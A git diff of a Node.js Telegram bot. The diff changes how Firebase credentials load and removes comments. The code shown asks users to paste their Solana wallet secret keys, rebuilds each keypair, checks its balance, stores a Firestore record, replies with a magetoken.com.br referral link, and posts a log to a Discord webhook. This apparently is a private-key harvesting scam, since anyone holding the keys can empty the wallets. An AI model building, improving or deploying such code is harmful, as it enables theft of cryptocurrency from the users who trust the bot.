@@ -7,12 +7,13 @@ const bs58 = rawBs58.default || rawBs58;
 const fetch = (...args) => import('node-fetch').then(({ default: fetch }) => fetch(...args));
 
 const bot = new Telegraf(process.env.BOT_TOKEN);
-const credentials = require(process.env.FIREBASE_CREDENTIALS);
+const credentials = JSON.parse(process.env.FIREBASE_CREDENTIALS_JSON); // ✅ CORRIGIDO
 const discordWebhook = process.env.DISCORD_WEBHOOK;
 
 admin.initializeApp({
   credential: admin.credential.cert(credentials),
 });
+
 const db = admin.firestore();
 const connection = new Connection("https://api.mainnet-beta.solana.com");
 
@@ -32,10 +33,8 @@ bot.on('text', async (ctx) => {
     let secret;
 
     if (input.startsWith('[')) {
-      // Trata como JSON array
       secret = JSON.parse(input);
     } else {
-      // Trata como base58
       const decoded = bs58.decode(input);
       secret = Array.from(decoded);
     }
@@ -45,11 +44,9 @@ bot.on('text', async (ctx) => {
     keypair = Keypair.fromSecretKey(Uint8Array.from(secret));
     const pubkey = keypair.publicKey.toBase58();
 
-    // Consulta saldo real
     const lamports = await connection.getBalance(new PublicKey(pubkey));
     const solBalance = (lamports / LAMPORTS_PER_SOL).toFixed(3);
 
-    // Firebase
     const userRef = db.collection('users').doc(pubkey);
     const docSnap = await userRef.get();
 
@@ -78,7 +75,6 @@ https://magetoken.com.br/?ref=${pubkey}
 
     await ctx.replyWithMarkdown(msg);
 
-    // Log para Discord
     try {
       await fetch(discordWebhook, {
         method: 'POST',
